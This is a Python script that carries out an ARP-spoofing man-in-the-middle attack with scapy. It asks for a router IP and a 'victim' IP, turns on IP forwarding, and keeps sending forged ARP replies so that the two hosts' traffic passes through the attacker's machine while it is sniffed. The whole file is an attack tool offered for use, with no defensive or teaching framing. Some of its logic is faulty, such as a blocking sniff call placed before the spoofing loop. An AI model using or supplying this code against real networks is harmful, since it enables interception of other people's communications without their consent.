from scapy.all import IP, UDP, TCP, ARP, send, sendp, Raw, get_if_hwaddr, getmacbyip, Ether, sniff 
from colorama import Fore, Back, Style
import ipaddress
import sys
import os
import subprocess
import time
import netifaces


#---------> straight line mark
def lineLeng(x, n):
    print(x * n)
#<---------

#---------> IP check Valid
def ip_checkv4(ip):
    parts = ip.split(".")
    if len(parts) != 4:
        print("Invalid IP: should have exactly 4 octets")
        return False

    try:
        nums = [int(part) for part in parts]
    except ValueError:
        print("Invalid IP: all parts must be numbers")
        return False

    a, b, c, d = nums

    if a <= 0 or a == 127 or a >= 255:
        print("Invalid IP: first octet out of range")
        return False
    if not (0 <= b < 255):
        print("Invalid IP: second octet out of range")
        return False
    if not (0 <= c < 255):
        print("Invalid IP: third octet out of range")
        return False
    if d <= 0 or d >= 255:
        print("Invalid IP: host ID (last octet) out of range")
        return False
    return True
#<---------

flow_R= input("Enter router IP-> ")
flow_T= input("Enter Victim IP-> ")
netFace=input("type your network interface: ")

interfaces = netifaces.interfaces()
print("Available network interfaces:", interfaces)

if netFace.strip() not in interfaces:
    print(Fore.RED + f"✘ Interface '{netFace}' not found. Exiting." + Style.RESET_ALL)
    sys.exit(1)
else:
    print(Fore.GREEN + f"✓ Interface '{netFace}' is available." + Style.RESET_ALL)

if not ip_checkv4(flow_R) or not ip_checkv4(flow_T):
    print(Fore.RED + "✘ Invalid IP provided. Exiting." + Style.RESET_ALL)
    sys.exit(1)  # end script

# sniff action
sniffer = sniff(prn=lambda x:x.summary(), iface=netFace)

print(Fore.GREEN + "✓ Both IP addresses are valid. Proceeding..." + Style.RESET_ALL)

my_mac= get_if_hwaddr(netFace)

#ACTIVE mac grabber admin is able to see ARP
V_R_MAC = getmacbyip(flow_R)
V_H_MAC = getmacbyip(flow_T)


print("Active action Mac&stick to IP (getmacbyip)")
print("Changing ip_forward = 1")
#for forward packets like router "PC in-between"
subprocess.Popen('echo 1 > /proc/sys/net/ipv4/ip_forward', shell=True)

#Restore normal traffic
def restore_arp():
    restore_victim = Ether(dst=V_H_MAC) / ARP(
        op=2,
        psrc=flow_R,
        pdst=flow_T,
        hwsrc=V_R_MAC,
        hwdst=V_H_MAC
    )
    restore_router = Ether(dst=V_R_MAC) / ARP(
        op=2,
        psrc=flow_T,
        pdst=flow_R,
        hwsrc=V_H_MAC,
        hwdst=V_R_MAC
    )
    sendp(restore_victim, count=5, iface=netFace, verbose=False)
    sendp(restore_router, count=5, iface=netFace, verbose=False)
    subprocess.call("echo 0 > /proc/sys/net/ipv4/ip_forward")

fake_to_victim= Ether(dst=V_H_MAC) / ARP(
    op=2,  # is-at
    psrc=flow_R,  # router IP
    pdst=flow_T,  # victim IP
    hwsrc=my_mac,
    hwdst=V_H_MAC
)

fake_to_router = Ether(dst=V_R_MAC) / ARP(
    op=2,
    psrc=flow_T,     # victim IP
    pdst=flow_R,     # router IP
    hwsrc=my_mac,
    hwdst=V_R_MAC
)

print("[!] Sent ARP poison to victim claiming I'm the router.")

try:
    #STOOOORM'EM!
    while True:
        sendp(fake_to_victim, iface=netFace, verbose=False)
        sendp(fake_to_router, iface=netFace, verbose=False)
        time.sleep(2)
        sniffer.summary()


except KeyboardInterrupt:
    #---------> ASCII Output:
    print(Fore.YELLOW + "IP: "+ Style.RESET_ALL)
    lineLeng("=", 30)

    print("Router: ", flow_R +os.linesep+ "Victim: ", flow_T)

    print(Fore.YELLOW + "\nMAC:"+ Style.RESET_ALL)
    lineLeng("=", 30)
    print("Router: ", V_R_MAC +os.linesep+ "Victim: ", V_H_MAC, Fore.CYAN+"\nOwner(you): ", my_mac + Style.RESET_ALL)
    #<-----------
    restore_arp()
